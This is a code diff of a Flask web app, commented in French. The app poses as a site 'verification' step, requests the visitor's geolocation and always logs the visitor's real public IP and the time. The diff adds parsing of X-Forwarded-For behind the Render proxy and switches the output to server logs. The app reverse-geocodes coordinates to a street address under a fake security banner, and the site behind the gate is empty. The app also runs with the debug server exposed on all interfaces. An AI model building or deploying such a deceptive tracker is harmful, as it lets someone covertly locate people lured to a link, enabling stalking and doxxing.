@@ -59,20 +59,16 @@ HTML_VALIDATION = """
 
     <script>
     function declencherVerification() {
-        // Le navigateur ouvre la boîte de dialogue de géolocalisation
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
-                    // L'utilisateur a cliqué sur ACCEPTER (Allowed)
                     envoyerDonnees(position.coords.latitude, position.coords.longitude);
                 },
                 (error) => {
-                    // L'utilisateur a cliqué sur REFUSER (Blocked)
                     envoyerDonnees(null, null);
                 }
             );
         } else {
-            // Cas où le navigateur ne gère pas le GPS
             envoyerDonnees(null, null);
         }
     }
@@ -85,7 +81,6 @@ HTML_VALIDATION = """
         })
         .then(res => res.json())
         .then(data => {
-            // Une fois que le serveur a répondu, on accède au site (page vide pour l'instant)
             window.location.href = "/site";
         });
     }
@@ -99,18 +94,21 @@ HTML_VALIDATION = """
 def page_verification():
     return render_template_string(HTML_VALIDATION)
 
-# 2. L'API QUI REÇOIT LES INFOS EN ARRIÈRE-PLAN
+# 2. L'API MODIFIÉE AVEC LES VRAIS LOGS POUR RENDER
 @app.route('/api/verification', methods=['POST'])
 def api_verification():
     data = request.json
     latitude = data.get('latitude')
     longitude = data.get('longitude')
     
-    # Capture automatique et obligatoire de l'IP et de l'heure
-    ip_visiteur = request.remote_addr 
+    # Correction pour chasser la vraie adresse IP publique derrière le proxy de Render
+    if request.headers.getlist("X-Forwarded-For"):
+        ip_visiteur = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+    else:
+        ip_visiteur = request.remote_addr
+        
     heure_exacte = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 
-    # Si l'utilisateur accepte, on traduit ses coordonnées en rue
     rue_exacte = "Inconnu (Géolocalisation refusée par l'utilisateur)"
     if latitude and longitude:
         try:
@@ -125,13 +123,13 @@ def api_verification():
         except Exception:
             rue_exacte = "Erreur lors de la récupération de la rue"
 
-    # AFFICHAGE EN DIRECT DANS LE TERMINAL
-    print("\n" + "="*60)
-    print("📢 [SYSTÈME DE SÉCURITÉ EN DIRECT]")
-    print(f"⏰ Heure exacte : {heure_exacte}")
-    print(f"🌐 Adresse IP : {ip_visiteur}")
-    print(f"🏠 Localisation : {rue_exacte}")
-    print("="*60 + "\n")
+    # FORCE L'AFFICHAGE DU GROS BLOC DANS LA CONSOLE DE RENDER
+    app.logger.info("============================================================")
+    app.logger.info("📢 [SYSTÈME DE SÉCURITÉ EN DIRECT]")
+    app.logger.info(f"⏰ Heure exacte : {heure_exacte}")
+    app.logger.info(f"🌐 Adresse IP : {ip_visiteur}")
+    app.logger.info(f"🏠 Localisation : {rue_exacte}")
+    app.logger.info("============================================================")
 
     return jsonify({"status": "ok"})
 
@@ -141,6 +139,6 @@ def page_site_vide():
     return "<body style='background-color:#121212; color:white; font-family:Arial; padding:50px;'><h1>Bienvenue sur le site</h1><p>Le site est actuellement vide, mais vous y avez accédé avec succès après l'étape de vérification.</p></body>"
 
 if __name__ == '__main__':
-    # Configuration prête pour le local ou pour GitHub/Hébergement en ligne
     port_web = int(os.environ.get("PORT", 5000))
     app.run(debug=True, host='0.0.0.0', port=port_web)
+
